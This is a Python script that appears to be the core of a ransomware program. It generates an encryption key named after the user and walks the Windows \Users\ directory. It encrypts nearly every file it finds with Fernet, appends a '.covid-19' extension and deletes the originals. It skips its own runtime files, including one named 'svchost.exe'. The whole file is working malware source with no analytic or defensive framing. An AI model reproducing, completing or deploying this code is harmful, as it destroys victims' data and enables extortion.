#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
usrkey = "{}.key".format(usr)
# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)
# FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    with open(name,'rb') as files:
        data = files.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    encrypted_file = name + ".covid-19"
    try:
        with open(encrypted_file, 'wb') as files:
            files.write(encrypted)

        os.remove(name)
    except:
        pass
# LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
def filelist():
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg" and file != "vcruntime140.dll" and file != "python37.dll" and file != "tk86t.dll" and file != "tcl86t.dll" and file != "library.zip" and file != "tclIndex"):
                    for ext in file.split("."):
                        if(file.endswith(ext)):
                            if(ext != "pyc" and ext != "pyd" and ext != "tcl" and ext != "h" and ext != "msg" and ext != "enc"):
                                try:
                                    ally = os.path.join(root, file)
                                    file_ecrypt(key, ally)
                                except PermissionError:
                                    pass
                                except:
                                    pass
